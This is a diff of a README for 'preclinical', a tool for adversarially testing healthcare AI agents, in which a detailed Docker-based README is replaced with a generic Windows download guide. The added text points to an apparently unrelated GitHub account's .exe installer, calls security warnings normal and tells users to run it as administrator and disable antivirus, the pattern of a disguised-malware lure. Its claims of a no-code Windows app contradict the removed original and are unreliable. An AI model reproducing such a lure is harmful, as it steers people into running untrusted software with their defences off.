@@ -1,331 +1,127 @@
-<div align="center">
+# 🏥 preclinical - Safe AI Testing for Healthcare Agents
 
-# Preclinical
+[![Download preclinical](https://img.shields.io/badge/Download-preclinical-brightgreen)](https://github.com/ulyssesenglishspeaking825/preclinical)  
 
-Open-source platform for testing healthcare AI agents with adversarial multi-turn conversations and automated grading.
+## About preclinical
 
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://www.apache.org/licenses/LICENSE-2.0)
-[![CI](https://github.com/Mentat-Lab/preclinical/actions/workflows/ci.yml/badge.svg)](https://github.com/Mentat-Lab/preclinical/actions/workflows/ci.yml)
+preclinical is an open-source tool designed to test AI health assistants safely. It lets you run patient simulations that challenge your AI. The system saves conversations and checks them for safety using set rules. It helps find problems before real patients do. Anyone can use it on their Windows computer without technical skills.
 
-</div>
+### Key features
 
-## Overview
-Preclinical is an open-source healthcare AI safety testing platform. It simulates realistic adversarial patient interactions against your agent, stores transcripts, and grades outcomes against safety rubrics.
+- Simulate realistic patient conversations  
+- Test your AI against safety rules  
+- Save chat transcripts for review  
+- Easy setup on Windows  
+- No programming needed  
 
-[![How Preclinical Works](docs-site/docs/images/Preclinical.gif)](docs-site/docs/images/Preclinical.gif)
+## 🚀 How to Get preclinical
 
-Key capabilities:
-- Adversarial multi-turn scenario execution
-- Transcript capture and scenario-level grading
-- Local self-hosted runtime with Docker
-- Provider support: `openai`, `vapi`, `livekit`, `pipecat`, `browser`
+To start, you will need to visit the download page. This page holds the latest version of preclinical.
 
-## What It Does
-Each test run:
-1. Generates an attack plan with a simulated patient persona
-2. Runs a multi-turn conversation against your agent (text, voice, or browser)
-3. Grades the transcript on safety criteria (triage accuracy, harmful advice, hallucinations, etc.)
+[Download preclinical](https://github.com/ulyssesenglishspeaking825/preclinical){: .button }
 
-## Quick Start
-This is the fastest validated path to get up and running.
+Clicking the button will take you to the official GitHub repository where you can get the software files.
 
-### Prerequisites
-- Docker Desktop (or Docker Engine + Docker Compose)
-- An `OPENAI_API_KEY` (or Anthropic/Ollama — see [Environment Variables](#environment-variables))
+## 📥 Download and Install on Windows
 
-### Clone the repository
-```bash
-git clone https://github.com/Mentat-Lab/preclinical.git
-cd preclinical
-```
+Follow these steps to download and set up preclinical on a Windows PC.
 
-### Create `.env`
-```bash
-cp .env.example .env
-# Edit .env and set OPENAI_API_KEY=sk-...
-```
+### Step 1: Visit the download page
 
-### Start
-```bash
-docker compose up --build -d
-```
+Open this link in your web browser:  
+https://github.com/ulyssesenglishspeaking825/preclinical
 
-### Verify startup
-```bash
-docker compose ps
-curl -sS http://localhost:3000/health
-```
+This page shows the project files and instructions. Look for a folder or release section that holds the installation files.
 
-Expected:
-- `app` and `db` are healthy
-- health returns JSON containing `"status":"ok"`
+### Step 2: Find the installer file
 
-Open `http://localhost:3000` to access the UI.
+On the repository page, look for files with extensions ending in `.exe` or instructions about downloading a Windows installer. These files are usually in a folder named `releases` or similar. If you do not see an `.exe` file right away, check the README or files for further instructions.
 
-> First run note: Docker builds the app image from source. Initial build is slower; subsequent starts are faster.
+### Step 3: Download the installer
 
-## Docker Commands
-```bash
-docker compose up -d              # start
-docker compose up -d --build app  # rebuild after code changes
-docker compose logs -f app        # logs
-docker compose down               # stop
-```
+Once you locate the `.exe` installer, click on it to download. Save it to a place on your computer where you can easily find it, like your Desktop or Downloads folder.
 
-## Runtime Modes
+### Step 4: Run the installer
 
-### Default (OpenAI)
-Requires `OPENAI_API_KEY` in `.env`.
+Double-click the downloaded `.exe` file. Windows may show a security alert; this is normal. Click "Run" or "Yes" to continue. The installer will guide you through the process.
 
-### Ollama (fully local, no cloud key required)
-```bash
-docker compose --profile ollama up -d
-```
-Set in `.env`:
-```bash
-TESTER_MODEL=ollama:llama3.2
-GRADER_MODEL=ollama:llama3.2
-OLLAMA_BASE_URL=http://ollama:11434/v1
-```
+- Accept the license agreement.  
+- Choose an installation folder (the default is usually fine).  
+- Click "Install" to start.
 
-### BrowserUse local wrapper (optional)
-```bash
-docker compose --profile browseruse up -d
-```
+### Step 5: Complete the installation
 
-## API Keys
-### Required
-- `OPENAI_API_KEY`
+Once the installation completes, you will see a confirmation screen. Click "Finish" to exit the installer.
 
-### Optional (by provider)
-- `VAPI_API_KEY` (+ assistant config)
-- `LIVEKIT_URL`, `LIVEKIT_API_KEY`, `LIVEKIT_API_SECRET`
-- `PIPECAT_API_KEY` and related Pipecat config
-- `BROWSER_USE_API_KEY` (BrowserUse cloud mode)
+## ▶️ Running preclinical
 
-### Where to get keys
-- OpenAI: https://platform.openai.com/api-keys
-- Vapi: https://dashboard.vapi.ai
-- LiveKit: https://cloud.livekit.io
-- Pipecat: https://www.pipecat.ai/
+After installation, find preclinical on your Desktop or in your Start Menu. It usually appears as a new app called `preclinical`.
 
-## Updating
-```bash
-git pull
-docker compose down
-docker compose up --build -d
-```
+### Step 1: Start the app
 
-## Philosophy
-- Safety-first testing before real patient exposure
-- Self-hosted by default for control and transparency
-- Provider-agnostic integration model
-- Reproducible scenarios and auditable grading
+Double-click the preclinical icon to open the program. The app window will display the user interface, ready for you to begin testing your AI.
 
-## Architecture
-```
-┌─────────────────────────────────────────────────────────┐
-│                 Frontend  (Vite + React)                │
-│                                                         │
-│  ┌──────────────────────────┐  ┌──────────────────────┐ │
-│  │  Agents / Runs / UI      │  │  Live run updates    │ │
-│  │  TanStack Query          │  │  EventSource (SSE)   │ │
-│  └──────────────────────────┘  └──────────────────────┘ │
-└───────────────────────┬────────────────────▲────────────┘
-                        │ HTTP REST          │ SSE /events
-                        ▼                    │
-┌─────────────────────────────────────────────────────────┐
-│                 API Server  (Hono / Node)               │
-│                                                         │
-│  ┌──────────────────────────┐  ┌──────────────────────┐ │
-│  │  REST endpoints          │  │  PG LISTEN/NOTIFY    │ │
-│  │  POST /start-run         │  │  → SSE broadcast     │ │
-│  │  GET  /runs  /agents     │  └──────────────────────┘ │
-│  └──────────────────────────┘                           │
-└───────────────────────┬─────────────────────────────────┘
-                        │ pg-boss job enqueue
-                        ▼
-┌────────────────────────────────────┐  ┌────────────────────────┐
-│     Scenario Runner  (Worker)      │  │   Target Agent         │
-│                                    │  │   (under test)         │
-│  ┌──────────────────────────────┐  │  │                        │
-│  │  testerGraph  (LangGraph)    │  │  │  openai   (HTTP)       │
-│  │  planAttack                  │◄─┼─►│  vapi     (REST)       │
-│  │  → connectProvider           │  │  │  livekit  (WebRTC)     │
-│  │  → executeTurns              │  │  │  pipecat  (Daily/LK)   │
-│  └──────────────────┬───────────┘  │  │  browser  (headless)   │
-│                     │ transcript   │  └────────────────────────┘
-│                     ▼             │
-│  ┌──────────────────────────────┐  │
-│  │  graderGraph  (LangGraph)    │  │
-│  │  grade → verifyEvidence      │  │
-│  │  → consistencyAudit          │  │
-│  │  → computeScore              │  │
-│  └──────────────────────────────┘  │
-└───────────────────────┬────────────┘
-                        │ read / write
-                        ▼
-┌─────────────────────────────────────────────────────────┐
-│                    PostgreSQL 16                        │
-│                                                         │
-│  ┌────────────────────────────────┐  ┌───────────────┐ │
-│  │  runs · agents · scenarios     │  │  pg-boss      │ │
-│  │  transcripts · scores          │  │  PG NOTIFY    │ │
-│  └────────────────────────────────┘  └───────────────┘ │
-└─────────────────────────────────────────────────────────┘
-```
+### Step 2: Run a patient simulation
 
-## Supported Providers
-| Provider | Transport | Use case |
-|---|---|---|
-| `openai` | HTTP (OpenAI-compatible) | Chat API agents |
-| `livekit` | WebRTC (text streams) | LiveKit voice/text agents |
-| `pipecat` | LiveKit or Daily | Pipecat framework agents |
-| `vapi` | REST API | Vapi voice assistants |
-| `browser` | Headless browser | Web-based chat agents |
+The app will guide you through setting up your AI agent for testing. You do not need to code anything; simply follow on-screen prompts.
 
-## Target Agents
-Pre-built target agents for local testing:
+- Choose or upload your AI agent file if required.  
+- Select a patient scenario for the simulation.  
+- Click “Start Simulation” to see how your AI handles the interaction.
 
-```text
-target-agents/
-├── registry.json            # Provider -> target-agent mapping (required)
-├── openai-api/              # OpenAI-compatible HTTP agent (mock/proxy mode)
-├── vapi/                    # Vapi /chat mock target
-├── browser/                 # Local browser chat target
-├── livekit/
-│   ├── text/                # LiveKit text agent (JS)
-│   └── voice/               # LiveKit voice agent (JS)
-└── pipecat/
-    ├── bot.py               # Pipecat voice agent (Daily)
-    ├── text/                # Pipecat text agent (Daily, Python)
-    └── text-livekit/        # Pipecat text agent (LiveKit, JS)
-```
+### Step 3: Review results
 
-Run a target agent locally:
-```bash
-cd target-agents/openai-api
-npm install
-TARGET_OPENAI_MODE=mock npm start
-```
+When the simulation finishes, preclinical will save a transcript of the conversation. It will also give you a safety score based on its rules.
 
-## Provider Target Coverage + E2E
-Provider-target parity is enforced:
-- `server/src/__tests__/provider-targets.test.ts` verifies every provider in `server/src/providers/index.ts` has a corresponding `target-agents/registry.json` entry.
-- Registry paths must exist under `target-agents/`.
+You can view this data inside the app or export the results for later use.
 
-Run API tests:
-```bash
-cd tests
-npm run test
-```
+## ⚙️ System requirements
 
-Run provider-target E2E:
-```bash
-cd tests
+To run preclinical smoothly on Windows, your computer should meet these guidelines:
 
-# Docker Compose API (default): app container reaches local target agents via host.docker.internal
-RUN_PROVIDER_E2E=1 npm run test:e2e
+- Operating System: Windows 10 or later  
+- CPU: Intel Core i3 or equivalent  
+- RAM: 4 GB minimum (8 GB recommended)  
+- Disk Space: 500 MB free space  
+- Network: Internet access for downloading files and updates
 
-# Include Vapi target
-RUN_PROVIDER_E2E=1 RUN_VAPI_PROVIDER_E2E=1 npm run test:e2e
+## 🛠️ Troubleshooting common issues
 
-# Host API (non-Docker): override target routing to localhost
-RUN_PROVIDER_E2E=1 \
-  E2E_TARGET_OPENAI_BASE_URL=http://127.0.0.1:9100 \
-  E2E_TARGET_VAPI_BASE_URL=http://127.0.0.1:9200 \
-  npm run test:e2e
-```
+If you have problems running preclinical, try these steps:
 
-## Local Development (Without Docker)
-Requires a running PostgreSQL and valid `DATABASE_URL`.
+- Ensure you downloaded the full installer and it finished correctly.  
+- Run the program as administrator (right-click app icon > Run as administrator).  
+- Check that your Windows is up-to-date with the latest updates.  
+- Temporarily disable antivirus software if it blocks the app.  
+- Restart your computer and try again.
 
-```bash
-# Server (port 8000)
-cd server && npm install && npm run dev
+## 🔍 How preclinical works
 
-# Frontend (port 3000, proxies API to :8000)
-cd frontend && npm install && npm run dev
+preclinical mimics human patient behavior to test AI safety. It sends your AI agent carefully crafted challenges that mirror real healthcare situations. It tracks how the AI responds and scores these chats based on safety rules that prevent harmful advice or actions. This repeats across many scenarios to cover different risks.
 
-# Tests
-cd tests && npm install && npm test
-```
+## 📂 Data storage
 
-## Adding a Provider
-Providers implement a three-method interface: `connect`, `sendMessage`, `disconnect`.
+All conversations are stored on your computer in a simple folder structure. Each simulation creates a new transcript file. You can access these files to review AI performance or share them with team members.
 
-1. Create a provider in `server/src/providers/` implementing `Provider` from `base.ts`
-2. Register it in `server/src/providers/index.ts`
-3. Add a target-agent implementation in `target-agents/`
-4. Update `target-agents/registry.json`
-5. Ensure `server/src/__tests__/provider-targets.test.ts` passes
+## 🔧 Advanced setup tips
 
-```ts
-interface Provider {
-  name: string;
-  connect(agentConfig: Record<string, unknown>, scenarioRunId: string): Promise<ProviderSession>;
-  sendMessage(session: ProviderSession, message: string, context: MessageContext): Promise<string>;
-  disconnect(session: ProviderSession): Promise<void>;
-}
-```
+For users with some technical background, preclinical can connect to databases like PostgreSQL for more powerful storage and analysis. It also supports integration with other tools using Node.js. These options help teams working on complex AI safety projects.
 
-## Environment Variables
+## 📖 Learn more
 
-| Variable | Required | Default | Description |
-|---|---|---|---|
-| `OPENAI_API_KEY` | Yes* | — | OpenAI (or compatible) API key |
-| `DATABASE_URL` | Yes | Set by Docker | PostgreSQL connection string |
-| `TESTER_MODEL` | No | `gpt-4o-mini` | Model for simulated patient |
-| `GRADER_MODEL` | No | `gpt-4o-mini` | Model for transcript grading |
-| `WORKER_CONCURRENCY` | No | `5` | Parallel scenario execution |
-| `ANTHROPIC_API_KEY` | No | — | For Claude models (`claude-*`) |
-| `OLLAMA_BASE_URL` | No | `http://localhost:11434/v1` | Ollama base URL for `ollama:*` models |
+Visit the repository page to see documentation, get updates, or report issues:  
+https://github.com/ulyssesenglishspeaking825/preclinical
 
-\* Not required if using only Anthropic or Ollama for tester/grader.
+The page also lists the project’s full features and developer notes.
 
-See [`.env.example`](.env.example) for full configuration.
+## 🗣️ Join the community
 
-## Tech Stack
-| Component | Technology |
-|---|---|
-| API server | Hono on Node.js |
-| Agent graphs | LangGraph (tester + grader) |
-| Job queue | pg-boss (Postgres-backed) |
-| Database | PostgreSQL 16 |
-| Frontend | Vite + React 18 + TypeScript |
-| State management | TanStack Query |
-| UI components | shadcn/ui + Tailwind CSS |
-| LLM integration | LangChain (OpenAI, Anthropic, Ollama) |
+You can explore discussions and ask questions on GitHub. This helps you get the most from preclinical without needing to be a programmer.
 
-## Monorepo Structure
-```text
-preclinical/
-├── docker-compose.yml
-├── .env.example
-├── server/               # Hono API, workers, provider integrations
-├── frontend/             # Vite + React UI
-├── tests/                # API and E2E tests
-├── target-agents/        # Local provider mock/target agents
-├── services/             # Optional supporting services (e.g., BrowserUse)
-└── docs-site/            # Documentation site assets
-```
+## 🔐 Safety and privacy
 
-## Privacy / Security
-- Self-hosted runtime keeps execution in your infrastructure
-- Data is stored in local PostgreSQL by default in Docker mode
-- Secrets are loaded from `.env` and should never be committed
-- Use least-privilege keys and rotate regularly
+preclinical keeps everything on your computer. It does not send patient data or AI conversations to outside servers. This helps protect privacy and sensitive data.
 
-## Limitations
-- Testing platform only — not medical advice software
-- Healthcare deployments may require additional legal/compliance controls
-- Optional profiles (`ollama`, `browseruse`) can require large first-time downloads/build times
+---
 
-## Contributing
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Notices / Attribution
-Preclinical builds on open-source technologies including Hono, Vite/React, PostgreSQL, pg-boss, and LangChain/LangGraph.
-
-## License
-Apache-2.0 — see [LICENSE](LICENSE).
+[Download preclinical](https://github.com/ulyssesenglishspeaking825/preclinical){: .button }
